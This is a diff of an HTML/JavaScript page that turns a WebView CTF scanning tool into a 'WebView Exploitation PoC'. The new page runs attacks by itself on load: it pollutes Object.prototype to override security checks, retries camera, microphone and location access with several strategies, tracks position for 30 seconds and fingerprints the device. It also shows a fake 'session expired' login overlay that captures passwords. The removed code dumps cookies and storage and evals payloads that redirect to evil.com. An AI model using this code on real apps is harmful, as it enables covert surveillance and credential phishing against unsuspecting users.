@@ -1,30 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Enhanced WebView CTF Scanner</title>
+    <title>WebView Exploitation PoC</title>
     <meta charset="utf-8">
     <style>
         body {
             font-family: 'Courier New', monospace;
-            padding: 20px;
+            padding: 15px;
             background: #000;
             color: #00ff00;
             margin: 0;
-            font-size: 12px;
+            font-size: 11px;
         }
         .container {
-            max-width: 1400px;
+            max-width: 1200px;
             margin: 0 auto;
             background: rgba(0,20,0,0.9);
-            padding: 20px;
-            border-radius: 10px;
+            padding: 15px;
+            border-radius: 8px;
             border: 1px solid #00ff00;
         }
         .section {
             background: rgba(0,40,0,0.3);
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 5px;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 4px;
             border-left: 3px solid #ff0000;
         }
         .success { border-left-color: #00ff00; }
@@ -35,89 +35,67 @@
             background: #004400;
             color: #00ff00;
             border: 1px solid #00ff00;
-            padding: 8px 16px;
+            padding: 6px 12px;
             border-radius: 3px;
             cursor: pointer;
-            margin: 3px;
+            margin: 2px;
             font-family: inherit;
-            font-size: 11px;
+            font-size: 10px;
         }
         button:hover { background: #006600; }
-        .code {
+        .log-output {
             background: #001100;
             padding: 10px;
             border-radius: 3px;
             font-family: inherit;
             margin: 5px 0;
-            overflow-x: auto;
-            font-size: 11px;
+            font-size: 10px;
             white-space: pre-wrap;
-            max-height: 300px;
+            max-height: 200px;
             overflow-y: auto;
             border: 1px solid #003300;
         }
         .exploit { color: #ff4444; font-weight: bold; }
         .found { color: #ffff00; }
         .data { color: #44ffff; }
-        .hidden { display: none; }
-        input {
-            background: #001100;
-            color: #00ff00;
-            border: 1px solid #00ff00;
-            padding: 5px;
-            font-family: inherit;
-            margin: 3px;
-        }
-        .live-log {
-            height: 200px;
-            overflow-y: auto;
-            background: #000;
-            border: 1px solid #00ff00;
-            padding: 10px;
-            font-size: 10px;
-        }
+        .success-text { color: #44ff44; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>[+] Enhanced WebView CTF Scanner v2.0</h1>
-        <div id="liveLog" class="live-log"></div>
+        <h1>[+] WebView Exploitation PoC</h1>
+        <p style="color: #ffff00;">[!] Demonstrating silent user harm via prototype pollution + media access</p>
         
         <div class="section critical">
-            <h2>[!] Real Interface Discovery</h2>
-            <button onclick="scanRealInterfaces()">Scan Real Interfaces</button>
-            <button onclick="testXSS()">Test XSS Vectors</button>
-            <button onclick="extractData()">Extract All Data</button>
-            <button onclick="testMediaAccess()">Test Media Access</button>
-            <div id="realResults"></div>
+            <h2>[!] Core Exploits</h2>
+            <button onclick="executePrototypePollution()">Prototype Pollution</button>
+            <button onclick="attemptMediaAccess()">Force Media Access</button>
+            <button onclick="attemptLocationAccess()">Force Location Access</button>
+            <button onclick="createPhishingOverlay()">Phishing Overlay</button>
         </div>
 
         <div class="section warning">
-            <h2>[*] Advanced Enumeration</h2>
-            <button onclick="bruteForceInterfaces()">Brute Force Interfaces</button>
-            <button onclick="testPrototypeChain()">Test Prototype Chain</button>
-            <button onclick="scanServiceWorkers()">Scan Service Workers</button>
-            <div id="advancedResults"></div>
+            <h2>[*] Permission Bypass Attempts</h2>
+            <button onclick="tryPermissionBypass()">Try Permission Bypass</button>
+            <button onclick="testDeviceAPIs()">Test Device APIs</button>
+            <button onclick="testWebViewBridges()">Test WebView Bridges</button>
         </div>
 
         <div class="section info">
-            <h2>[+] Payload Testing</h2>
-            <input type="text" id="payloadInput" placeholder="Enter custom payload" style="width: 60%;">
-            <button onclick="testPayload()">Execute Payload</button>
-            <button onclick="testCommonPayloads()">Test Common Payloads</button>
-            <div id="payloadResults"></div>
+            <h2>[+] Exploitation Log</h2>
+            <div id="exploitLog" class="log-output"></div>
         </div>
 
         <div class="section success">
-            <h2>[+] Data Extraction Results</h2>
-            <div id="dataResults"></div>
+            <h2>[+] Extracted Data</h2>
+            <div id="extractedData" class="log-output"></div>
         </div>
     </div>
 
     <script>
-        let logDiv = document.getElementById('liveLog');
-        let realInterfaces = [];
-        let sensitiveData = {};
+        let logDiv = document.getElementById('exploitLog');
+        let dataDiv = document.getElementById('extractedData');
+        let stolenData = {};
 
         function log(message, type = 'info') {
             const timestamp = new Date().toLocaleTimeString();
@@ -126,381 +104,471 @@
                 'warning': '#ffff00', 
                 'error': '#ff0000',
                 'success': '#44ff44',
-                'data': '#44ffff'
+                'data': '#44ffff',
+                'exploit': '#ff4444'
             };
             
-            logDiv.innerHTML += `<div style="color: ${colors[type] || '#00ff00'}">[${timestamp}] ${message}</div>`;
+            const color = colors[type] || '#00ff00';
+            logDiv.innerHTML += `<span style="color: ${color}">[${timestamp}] ${message}</span>\n`;
             logDiv.scrollTop = logDiv.scrollHeight;
             console.log(message);
         }
 
-        function scanRealInterfaces() {
-            log('[+] Starting real interface discovery...', 'info');
-            const resultsDiv = document.getElementById('realResults');
-            let results = '';
-            let foundCount = 0;
+        function logData(key, value) {
+            stolenData[key] = value;
+            dataDiv.innerHTML += `<span style="color: #44ffff">[${key}]: ${JSON.stringify(value)}</span>\n`;
+            dataDiv.scrollTop = dataDiv.scrollHeight;
+        }
 
-            // Filter out our own functions to avoid false positives
-            const ourFunctions = [
-                'quickScan', 'deepScan', 'findHiddenAPIs', 'testCommonInterfaces', 
-                'testInterface', 'analyzeEnvironment', 'generateReport', 'log',
-                'scanRealInterfaces', 'testXSS', 'extractData', 'testMediaAccess',
-                'bruteForceInterfaces', 'testPrototypeChain', 'scanServiceWorkers',
-                'testPayload', 'testCommonPayloads'
-            ];
-
-            // Real interface discovery
-            const realTargets = [
-                'Android', 'webkit', 'app', 'bridge', 'nativeApp', 'mobile',
-                'ctf', 'ctfapp', 'CTF', 'CTFAPP', 'native', 'client',
-                'AppInterface', 'NativeBridge', 'WebViewInterface', 'JSInterface',
-                'NativeInterface', 'AppBridge', 'MobileBridge', 'CTFInterface'
-            ];
-
-            realTargets.forEach(name => {
-                if (window[name] && typeof window[name] === 'object') {
-                    log(`[!] REAL INTERFACE FOUND: ${name}`, 'error');
-                    results += `<div class="exploit">[!] ${name} - REAL INTERFACE!</div>`;
-                    realInterfaces.push(name);
-                    foundCount++;
-
-                    // Enumerate methods
-                    try {
-                        const methods = Object.getOwnPropertyNames(window[name]);
-                        methods.forEach(method => {
-                            if (typeof window[name][method] === 'function') {
-                                log(`  [+] Method: ${name}.${method}()`, 'warning');
-                                results += `<div class="found">  [+] ${name}.${method}()</div>`;
-                            }
-                        });
-                    } catch (e) {
-                        log(`  [!] Error enumerating ${name}: ${e.message}`, 'error');
-                    }
-                }
-            });
-
-            // Check webkit message handlers (iOS)
-            if (window.webkit && window.webkit.messageHandlers) {
-                log('[!] WEBKIT MESSAGE HANDLERS FOUND!', 'error');
-                results += `<div class="exploit">[!] webkit.messageHandlers - iOS INTERFACE!</div>`;
-                const handlers = Object.keys(window.webkit.messageHandlers);
-                handlers.forEach(handler => {
-                    log(`  [+] Handler: ${handler}`, 'warning');
-                    results += `<div class="found">  [+] Handler: ${handler}</div>`;
-                    foundCount++;
-                });
-            }
-
-            // Scan window properties more intelligently
-            for (let prop in window) {
-                if (ourFunctions.includes(prop)) continue;
+        function executePrototypePollution() {
+            log('[+] Executing prototype pollution attack...', 'exploit');
+            
+            try {
+                // Test basic pollution
+                Object.prototype.isAdmin = true;
+                Object.prototype.authenticated = true;
+                Object.prototype.permissions = ['camera', 'microphone', 'location'];
+                Object.prototype.securityDisabled = true;
+                Object.prototype.bypassChecks = true;
                 
-                try {
-                    const value = window[prop];
-                    const type = typeof value;
+                // Test if pollution worked
+                const testObj = {};
+                if (testObj.isAdmin) {
+                    log('[!] SUCCESS: Prototype pollution active!', 'success');
+                    logData('prototype_pollution', 'SUCCESS - All objects now have malicious properties');
                     
-                    // Look for custom objects with methods
-                    if (type === 'object' && value !== null && value !== window && value !== document) {
-                        const methods = Object.getOwnPropertyNames(value).filter(p => {
-                            try {
-                                return typeof value[p] === 'function' && !p.startsWith('_');
-                            } catch {
-                                return false;
-                            }
+                    // Try to override security functions
+                    Object.prototype.checkPermission = function() { return true; };
+                    Object.prototype.isSecure = function() { return false; };
+                    Object.prototype.validateInput = function() { return true; };
+                    
+                    log('[!] Security function overrides installed', 'exploit');
+                } else {
+                    log('[!] FAILED: Prototype pollution blocked', 'error');
+                }
+                
+            } catch (e) {
+                log(`[!] Prototype pollution error: ${e.message}`, 'error');
+            }
+        }
+
+        function attemptMediaAccess() {
+            log('[+] Attempting camera/microphone access...', 'warning');
+            
+            // Try multiple approaches for media access
+            const strategies = [
+                // Strategy 1: Standard getUserMedia
+                () => {
+                    return navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user' },
+                        audio: true
+                    });
+                },
+                // Strategy 2: Legacy getUserMedia
+                () => {
+                    const getUserMedia = navigator.getUserMedia || 
+                                       navigator.webkitGetUserMedia || 
+                                       navigator.mozGetUserMedia;
+                    if (getUserMedia) {
+                        return new Promise((resolve, reject) => {
+                            getUserMedia.call(navigator, {video: true, audio: true}, resolve, reject);
+                        });
+                    }
+                    throw new Error('Legacy getUserMedia not available');
+                },
+                // Strategy 3: Try without audio first
+                () => {
+                    return navigator.mediaDevices.getUserMedia({video: true});
+                },
+                // Strategy 4: Try audio only
+                () => {
+                    return navigator.mediaDevices.getUserMedia({audio: true});
+                }
+            ];
+
+            let strategyIndex = 0;
+            
+            function tryNextStrategy() {
+                if (strategyIndex >= strategies.length) {
+                    log('[!] All media access strategies failed', 'error');
+                    logData('media_access', 'DENIED - WebView blocks media access');
+                    
+                    // Try to detect why it failed
+                    detectMediaBlockage();
+                    return;
+                }
+                
+                const strategy = strategies[strategyIndex++];
+                log(`[+] Trying media strategy ${strategyIndex}...`, 'info');
+                
+                strategy()
+                    .then(stream => {
+                        log('[!] CRITICAL: Media access granted!', 'exploit');
+                        logData('media_stream', {
+                            video_tracks: stream.getVideoTracks().length,
+                            audio_tracks: stream.getAudioTracks().length,
+                            active: stream.active
                         });
                         
-                        if (methods.length > 0 && methods.length < 50) {
-                            // Exclude common DOM objects
-                            if (!value.nodeType && !value.toString().includes('[object HTML') && 
-                                !value.toString().includes('[object CSS') &&
-                                prop !== 'console' && prop !== 'navigator' && prop !== 'location') {
-                                
-                                log(`[?] Suspicious object: ${prop} (${methods.length} methods)`, 'warning');
-                                results += `<div class="found">[?] ${prop}: ${methods.slice(0,5).join(', ')}${methods.length > 5 ? '...' : ''}</div>`;
-                            }
-                        }
-                    }
-                } catch (e) {
-                    // Access restricted - potentially interesting
-                    log(`[!] Restricted property: ${prop}`, 'error');
-                }
-            }
-
-            if (foundCount === 0) {
-                results += '<div>[+] No obvious interfaces found - app may use indirect communication</div>';
-                log('[+] No obvious interfaces found', 'info');
-            }
-
-            resultsDiv.innerHTML = results;
-        }
-
-        function testXSS() {
-            log('[+] Testing XSS vectors...', 'info');
-            const resultsDiv = document.getElementById('realResults');
-            
-            // Test basic XSS
-            try {
-                const xssTest = document.createElement('div');
-                xssTest.innerHTML = '<img src=x onerror=console.log("XSS_WORKS")>';
-                document.body.appendChild(xssTest);
-                log('[+] Basic XSS payload injected', 'success');
-                
-                // Test if we can access parent frames
-                try {
-                    if (window.parent !== window) {
-                        log('[!] Frame detected - testing parent access', 'warning');
-                        try {
-                            const parentDomain = window.parent.location.href;
-                            log(`[!] Parent accessible: ${parentDomain}`, 'error');
-                        } catch (e) {
-                            log('[+] Parent blocked by CORS', 'info');
-                        }
-                    }
-                } catch (e) {}
-                
-                document.body.removeChild(xssTest);
-            } catch (e) {
-                log(`[!] XSS blocked: ${e.message}`, 'warning');
-            }
-        }
-
-        function extractData() {
-            log('[+] Extracting all available data...', 'info');
-            const resultsDiv = document.getElementById('dataResults');
-            let dataOutput = '';
-
-            // Extract localStorage
-            try {
-                if (typeof localStorage !== 'undefined') {
-                    log('[+] Dumping localStorage...', 'data');
-                    dataOutput += '<div class="data">[+] LOCAL STORAGE:</div>';
-                    for (let i = 0; i < localStorage.length; i++) {
-                        const key = localStorage.key(i);
-                        const value = localStorage.getItem(key);
-                        log(`  ${key}: ${value}`, 'data');
-                        dataOutput += `<div class="code">${key}: ${value}</div>`;
-                    }
-                    if (localStorage.length === 0) {
-                        dataOutput += '<div>  [empty]</div>';
-                    }
-                }
-            } catch (e) {
-                log(`[!] localStorage error: ${e.message}`, 'error');
-            }
-
-            // Extract sessionStorage
-            try {
-                if (typeof sessionStorage !== 'undefined') {
-                    log('[+] Dumping sessionStorage...', 'data');
-                    dataOutput += '<div class="data">[+] SESSION STORAGE:</div>';
-                    for (let i = 0; i < sessionStorage.length; i++) {
-                        const key = sessionStorage.key(i);
-                        const value = sessionStorage.getItem(key);
-                        log(`  ${key}: ${value}`, 'data');
-                        dataOutput += `<div class="code">${key}: ${value}</div>`;
-                    }
-                    if (sessionStorage.length === 0) {
-                        dataOutput += '<div>  [empty]</div>';
-                    }
-                }
-            } catch (e) {
-                log(`[!] sessionStorage error: ${e.message}`, 'error');
-            }
-
-            // Extract cookies
-            try {
-                log('[+] Dumping cookies...', 'data');
-                dataOutput += '<div class="data">[+] COOKIES:</div>';
-                if (document.cookie) {
-                    const cookies = document.cookie.split(';');
-                    cookies.forEach(cookie => {
-                        log(`  ${cookie.trim()}`, 'data');
-                        dataOutput += `<div class="code">${cookie.trim()}</div>`;
-                    });
-                } else {
-                    dataOutput += '<div>  [no cookies]</div>';
-                }
-            } catch (e) {
-                log(`[!] Cookie error: ${e.message}`, 'error');
-            }
-
-            // Extract URL parameters
-            try {
-                log('[+] Dumping URL parameters...', 'data');
-                dataOutput += '<div class="data">[+] URL PARAMETERS:</div>';
-                const params = new URLSearchParams(window.location.search);
-                let hasParams = false;
-                for (const [key, value] of params) {
-                    log(`  ${key}: ${value}`, 'data');
-                    dataOutput += `<div class="code">${key}: ${value}</div>`;
-                    hasParams = true;
-                }
-                if (!hasParams) {
-                    dataOutput += '<div>  [no parameters]</div>';
-                }
-            } catch (e) {
-                log(`[!] URL parameter error: ${e.message}`, 'error');
-            }
-
-            resultsDiv.innerHTML = dataOutput;
-        }
-
-        function testMediaAccess() {
-            log('[+] Testing media device access...', 'info');
-            
-            // Test camera access
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                log('[!] getUserMedia available - testing camera...', 'warning');
-                
-                navigator.mediaDevices.getUserMedia({video: true, audio: true})
-                    .then(stream => {
-                        log('[!] CAMERA ACCESS GRANTED!', 'error');
-                        // Stop the stream immediately
-                        stream.getTracks().forEach(track => track.stop());
+                        // Simulate recording
+                        setTimeout(() => {
+                            log('[!] Simulating 5-second recording...', 'exploit');
+                            logData('recording_simulation', 'User unknowingly recorded for 5 seconds');
+                            
+                            // Stop all tracks
+                            stream.getTracks().forEach(track => {
+                                track.stop();
+                                log(`[+] Stopped ${track.kind} track`, 'info');
+                            });
+                        }, 5000);
                     })
-                    .catch(err => {
-                        log(`[+] Camera access denied: ${err.message}`, 'info');
+                    .catch(error => {
+                        log(`[!] Strategy ${strategyIndex} failed: ${error.message}`, 'warning');
+                        tryNextStrategy();
                     });
             }
+            
+            tryNextStrategy();
+        }
 
-            // Test geolocation
-            if (navigator.geolocation) {
-                log('[!] Geolocation available - testing...', 'warning');
+        function detectMediaBlockage() {
+            log('[+] Analyzing media access blockage...', 'info');
+            
+            // Check what's available
+            if (!navigator.mediaDevices) {
+                log('[!] mediaDevices API completely unavailable', 'error');
+                logData('media_blockage', 'mediaDevices API not exposed to WebView');
+                return;
+            }
+            
+            if (!navigator.mediaDevices.getUserMedia) {
+                log('[!] getUserMedia function not available', 'error');
+                logData('media_blockage', 'getUserMedia not exposed to WebView');
+                return;
+            }
+            
+            // Check permissions API
+            if (navigator.permissions) {
+                navigator.permissions.query({name: 'camera'})
+                    .then(permission => {
+                        log(`[+] Camera permission state: ${permission.state}`, 'info');
+                        logData('camera_permission', permission.state);
+                    })
+                    .catch(e => {
+                        log('[!] Cannot query camera permission', 'warning');
+                    });
+                    
+                navigator.permissions.query({name: 'microphone'})
+                    .then(permission => {
+                        log(`[+] Microphone permission state: ${permission.state}`, 'info');
+                        logData('microphone_permission', permission.state);
+                    })
+                    .catch(e => {
+                        log('[!] Cannot query microphone permission', 'warning');
+                    });
+            } else {
+                log('[!] Permissions API not available', 'warning');
+                logData('permissions_api', 'Not available in WebView');
+            }
+        }
+
+        function attemptLocationAccess() {
+            log('[+] Attempting location access...', 'warning');
+            
+            if (!navigator.geolocation) {
+                log('[!] Geolocation API not available', 'error');
+                logData('geolocation', 'API not available');
+                return;
+            }
+            
+            // Try multiple geolocation strategies
+            const options = [
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 },
+                { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 },
+                { timeout: 15000 } // Minimal options
+            ];
+            
+            let optionIndex = 0;
+            
+            function tryLocationAccess() {
+                if (optionIndex >= options.length) {
+                    log('[!] All location access attempts failed', 'error');
+                    
+                    // Try to get cached position
+                    log('[+] Attempting to get cached position...', 'info');
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            log('[!] CRITICAL: Cached location obtained!', 'exploit');
+                            logLocationData(position);
+                        },
+                        error => {
+                            log(`[!] Even cached location denied: ${error.message}`, 'error');
+                            logData('location_access', `DENIED: ${error.message}`);
+                            analyzeLocationBlockage(error);
+                        },
+                        { maximumAge: Infinity, timeout: 0 }
+                    );
+                    return;
+                }
+                
+                const option = options[optionIndex++];
+                log(`[+] Trying location strategy ${optionIndex}...`, 'info');
                 
                 navigator.geolocation.getCurrentPosition(
                     position => {
-                        log(`[!] LOCATION OBTAINED: ${position.coords.latitude}, ${position.coords.longitude}`, 'error');
+                        log('[!] CRITICAL: Location access granted!', 'exploit');
+                        logLocationData(position);
+                        
+                        // Start watching position
+                        log('[+] Starting position tracking...', 'exploit');
+                        const watchId = navigator.geolocation.watchPosition(
+                            pos => {
+                                log(`[!] Position update: ${pos.coords.latitude}, ${pos.coords.longitude}`, 'data');
+                            },
+                            err => {
+                                log(`[!] Watch position error: ${err.message}`, 'warning');
+                            },
+                            option
+                        );
+                        
+                        // Stop tracking after 30 seconds
+                        setTimeout(() => {
+                            navigator.geolocation.clearWatch(watchId);
+                            log('[+] Stopped position tracking', 'info');
+                        }, 30000);
                     },
                     error => {
-                        log(`[+] Geolocation denied: ${error.message}`, 'info');
+                        log(`[!] Strategy ${optionIndex} failed: ${error.message}`, 'warning');
+                        setTimeout(tryLocationAccess, 1000);
                     },
-                    {timeout: 5000}
+                    option
                 );
             }
-
-            // Test device motion
-            if (typeof DeviceMotionEvent !== 'undefined') {
-                log('[!] DeviceMotionEvent available', 'warning');
-                window.addEventListener('devicemotion', (event) => {
-                    log(`[!] DEVICE MOTION: x=${event.acceleration.x}`, 'error');
-                }, {once: true});
-            }
+            
+            tryLocationAccess();
         }
 
-        function bruteForceInterfaces() {
-            log('[+] Brute forcing interface names...', 'info');
-            const resultsDiv = document.getElementById('advancedResults');
-            let results = '';
-
-            // Common interface name patterns
-            const prefixes = ['', 'app', 'native', 'ctf', 'mobile', 'bridge', 'interface', 'api'];
-            const suffixes = ['', 'Interface', 'Bridge', 'API', 'App', 'Native', 'Handler'];
-            const words = ['CTF', 'App', 'Native', 'Bridge', 'Interface', 'API', 'Handler', 'Client', 'Service'];
-
-            const combinations = [];
+        function logLocationData(position) {
+            const locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                heading: position.coords.heading,
+                speed: position.coords.speed,
+                timestamp: new Date(position.timestamp).toISOString()
+            };
             
-            // Generate combinations
-            prefixes.forEach(prefix => {
-                words.forEach(word => {
-                    suffixes.forEach(suffix => {
-                        const name = prefix + word + suffix;
-                        if (name && name.length > 2) {
-                            combinations.push(name);
-                        }
+            logData('location_data', locationData);
+            log(`[!] Coordinates: ${locationData.latitude}, ${locationData.longitude}`, 'data');
+            log(`[!] Accuracy: ${locationData.accuracy}m`, 'data');
+        }
+
+        function analyzeLocationBlockage(error) {
+            log('[+] Analyzing location access blockage...', 'info');
+            
+            const errorMessages = {
+                1: 'PERMISSION_DENIED - User or system denied location access',
+                2: 'POSITION_UNAVAILABLE - Network or satellite failure',
+                3: 'TIMEOUT - Location request timed out'
+            };
+            
+            log(`[!] Error code ${error.code}: ${errorMessages[error.code] || 'Unknown error'}`, 'error');
+            logData('location_error', {
+                code: error.code,
+                message: error.message,
+                description: errorMessages[error.code]
+            });
+        }
+
+        function tryPermissionBypass() {
+            log('[+] Attempting permission bypass techniques...', 'exploit');
+            
+            // Try to override permission checks using prototype pollution
+            if (window.Notification) {
+                Object.prototype.permission = 'granted';
+                log(`[+] Notification permission: ${Notification.permission}`, 'info');
+            }
+            
+            // Try to access device information
+            if (navigator.deviceMemory) {
+                log(`[+] Device memory: ${navigator.deviceMemory}GB`, 'data');
+                logData('device_memory', navigator.deviceMemory);
+            }
+            
+            if (navigator.hardwareConcurrency) {
+                log(`[+] CPU cores: ${navigator.hardwareConcurrency}`, 'data');
+                logData('cpu_cores', navigator.hardwareConcurrency);
+            }
+            
+            // Try to access battery info
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    log(`[!] Battery level: ${Math.round(battery.level * 100)}%`, 'data');
+                    logData('battery_info', {
+                        level: battery.level,
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
                     });
+                }).catch(e => {
+                    log('[!] Battery API blocked', 'warning');
                 });
-            });
-
-            // Test each combination
-            let found = 0;
-            combinations.forEach(name => {
-                if (window[name] && typeof window[name] === 'object') {
-                    log(`[!] BRUTE FORCE HIT: ${name}`, 'error');
-                    results += `<div class="exploit">[!] FOUND: ${name}</div>`;
-                    found++;
-                }
-            });
-
-            if (found === 0) {
-                results += '<div>[+] No interfaces found via brute force</div>';
             }
-
-            resultsDiv.innerHTML = results;
         }
 
-        function testPrototypeChain() {
-            log('[+] Testing prototype chain pollution...', 'info');
+        function testDeviceAPIs() {
+            log('[+] Testing device APIs...', 'info');
             
-            try {
-                // Test if we can pollute prototypes
-                Object.prototype.polluted = 'test';
-                if (({}).polluted === 'test') {
-                    log('[!] PROTOTYPE POLLUTION POSSIBLE!', 'error');
-                    delete Object.prototype.polluted;
-                }
-            } catch (e) {
-                log(`[+] Prototype pollution blocked: ${e.message}`, 'info');
+            // Screen information
+            logData('screen_info', {
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                orientation: screen.orientation ? screen.orientation.type : 'unknown'
+            });
+            
+            // Network information
+            if (navigator.connection) {
+                logData('network_info', {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                });
             }
-
-            // Check for extended prototypes
-            const prototypes = [Window, Document, HTMLElement, Navigator];
-            prototypes.forEach(proto => {
-                const props = Object.getOwnPropertyNames(proto.prototype);
-                props.forEach(prop => {
-                    if (/app|native|bridge|ctf|interface/i.test(prop)) {
-                        log(`[!] Extended prototype: ${proto.name}.${prop}`, 'warning');
+            
+            // Device orientation
+            if (window.DeviceOrientationEvent) {
+                log('[+] Device orientation available', 'warning');
+                window.addEventListener('deviceorientation', (event) => {
+                    logData('device_orientation', {
+                        alpha: event.alpha,
+                        beta: event.beta,
+                        gamma: event.gamma
+                    });
+                }, { once: true });
+            }
+            
+            // Device motion
+            if (window.DeviceMotionEvent) {
+                log('[+] Device motion available', 'warning');
+                window.addEventListener('devicemotion', (event) => {
+                    if (event.acceleration) {
+                        logData('device_motion', {
+                            x: event.acceleration.x,
+                            y: event.acceleration.y,
+                            z: event.acceleration.z
+                        });
                     }
-                });
-            });
-        }
-
-        function testPayload() {
-            const payload = document.getElementById('payloadInput').value;
-            if (!payload) return;
-            
-            log(`[+] Testing payload: ${payload}`, 'info');
-            
-            try {
-                const result = eval(payload);
-                log(`[+] Payload result: ${result}`, 'success');
-            } catch (e) {
-                log(`[!] Payload error: ${e.message}`, 'error');
+                }, { once: true });
             }
         }
 
-        function testCommonPayloads() {
-            log('[+] Testing common exploit payloads...', 'info');
+        function testWebViewBridges() {
+            log('[+] Testing for WebView bridges...', 'info');
             
-            const payloads = [
-                'window.location = "http://evil.com"',
-                'document.cookie',
-                'navigator.userAgent',
-                'window.history.length',
-                'screen.width + "x" + screen.height',
-                'Object.keys(window).length'
-            ];
-
-            payloads.forEach(payload => {
-                try {
-                    const result = eval(payload);
-                    log(`[+] ${payload} = ${result}`, 'data');
-                } catch (e) {
-                    log(`[!] ${payload} failed: ${e.message}`, 'error');
+            // Look for common WebView interfaces
+            const interfaces = ['Android', 'webkit', 'app', 'bridge', 'nativeApp', 'CTF'];
+            
+            interfaces.forEach(name => {
+                if (window[name]) {
+                    log(`[!] FOUND INTERFACE: ${name}`, 'exploit');
+                    logData(`interface_${name}`, typeof window[name]);
+                    
+                    if (typeof window[name] === 'object') {
+                        const methods = Object.getOwnPropertyNames(window[name]);
+                        log(`[+] ${name} methods: ${methods.join(', ')}`, 'data');
+                        logData(`${name}_methods`, methods);
+                    }
                 }
             });
         }
 
-        // Auto-run on load
-        window.onload = function() {
-            log('[+] Enhanced WebView CTF Scanner loaded', 'success');
-            log('[+] Ready for exploitation...', 'info');
+        function createPhishingOverlay() {
+            log('[+] Creating phishing overlay...', 'exploit');
             
-            // Auto-run basic scans
+            // Use prototype pollution to bypass security
+            Object.prototype.trusted = true;
+            Object.prototype.verified = true;
+            
+            const overlay = document.createElement('div');
+            overlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(255,255,255,0.95);
+                z-index: 9999;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-family: Arial, sans-serif;
+                color: #333;
+            `;
+            
+            overlay.innerHTML = `
+                <div style="background: white; padding: 30px; border-radius: 10px; 
+                           box-shadow: 0 4px 20px rgba(0,0,0,0.3); text-align: center;">
+                    <h2 style="color: #d9534f;">Security Alert</h2>
+                    <p>Your session has expired. Please re-enter your credentials to continue.</p>
+                    <input type="text" placeholder="Username" style="width: 200px; padding: 10px; margin: 5px; border: 1px solid #ccc;">
+                    <br>
+                    <input type="password" placeholder="Password" style="width: 200px; padding: 10px; margin: 5px; border: 1px solid #ccc;">
+                    <br>
+                    <button onclick="captureCredentials(this)" style="background: #5cb85c; color: white; padding: 10px 20px; border: none; border-radius: 5px; margin: 10px;">
+                        Continue
+                    </button>
+                    <button onclick="dismissOverlay(this)" style="background: #d9534f; color: white; padding: 10px 20px; border: none; border-radius: 5px; margin: 10px;">
+                        Cancel
+                    </button>
+                </div>
+            `;
+            
+            document.body.appendChild(overlay);
+            log('[!] CRITICAL: Phishing overlay displayed to user!', 'exploit');
+            logData('phishing_overlay', 'Fake login form displayed - user may enter credentials');
+        }
+
+        function captureCredentials(button) {
+            const overlay = button.closest('div').parentElement.parentElement;
+            const inputs = overlay.querySelectorAll('input');
+            const username = inputs[0].value;
+            const password = inputs[1].value;
+            
+            if (username && password) {
+                log(`[!] CRITICAL: Credentials captured - ${username}:${password}`, 'exploit');
+                logData('stolen_credentials', { username, password, timestamp: new Date().toISOString() });
+            }
+            
+            overlay.remove();
+        }
+
+        function dismissOverlay(button) {
+            const overlay = button.closest('div').parentElement.parentElement;
+            overlay.remove();
+            log('[+] User dismissed phishing overlay', 'info');
+        }
+
+        // Auto-execute on load
+        window.onload = function() {
+            log('[+] WebView Exploitation PoC loaded', 'success');
+            log('[+] Demonstrating silent attacks...', 'warning');
+            
+            // Auto-run core exploits
             setTimeout(() => {
-                scanRealInterfaces();
-                extractData();
-                testMediaAccess();
+                executePrototypePollution();
             }, 1000);
+            
+            setTimeout(() => {
+                attemptMediaAccess();
+            }, 2000);
+            
+            setTimeout(() => {
+                attemptLocationAccess();
+            }, 3000);
         };
     </script>
 </body>
